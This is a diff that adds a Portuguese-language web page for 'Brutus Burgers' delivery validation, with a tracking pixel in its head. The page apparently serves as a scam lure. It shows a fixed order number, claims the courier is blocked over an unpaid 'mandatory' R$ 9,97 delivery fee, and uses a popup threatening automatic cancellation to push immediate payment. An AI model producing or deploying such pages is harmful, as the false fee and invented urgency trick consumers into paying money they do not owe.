@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><script>
+  window.pixelId = "683c98f09a73a8ab732af8b3";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Brutus Burgers | Validação de Frete</title>
+  <link rel="stylesheet" href="assets/css/style.css"/>
+  <script defer src="assets/js/script.js"></script>
+</head>
+<body>
+  <div class="main-box">
+    <header class="header">
+      <img src="assets/img/logo.png" alt="Brutus Logo" class="logo">
+      <h1>Validação de Entrega</h1>
+      <p>Pedido <strong>#BR932184</strong> recebido</p>
+    </header>
+
+    <div class="status-box">
+      <ul class="status-steps">
+        <li class="step">Pedido Recebido</li>
+        <li class="step">Preparando</li>
+        <li class="step">Pronto</li>
+        <li class="step">FRETE NÃO PAGO</li>
+      </ul>
+      <div class="bar"><div id="progress-fill"></div></div>
+    </div>
+
+    <section class="cta-section">
+      <p class="alert-text">⚠️ A liberação do motoboy está bloqueada por falta do pagamento do <strong>frete obrigatório</strong> (R$ 9,97).</p>
+      <button id="btn-confirmar" onclick="confirmarFrete()" disabled>Regularizar Frete Agora</button>
+    </section>
+  </div>
+
+  <div id="overlay"></div>
+  <div id="popup">
+    <img src="assets/img/erro.gif" alt="Erro" class="gif-erro">
+    <h2>Frete Não Confirmado</h2>
+    <p>
+      Não foi possível liberar o <strong>pedido #BR932184</strong>.<br><br>
+      A taxa de <strong>R$ 9,97 referente ao frete</strong> não foi identificada.<br>
+      O pedido será cancelado automaticamente em instantes.<br><br>
+      Para evitar o cancelamento, conclua o pagamento agora.
+    </p>
+    <button class="confirm-button" onclick="finalizarPagamento()">Concluir Pagamento</button>
+  </div>
+</body>
+</html>
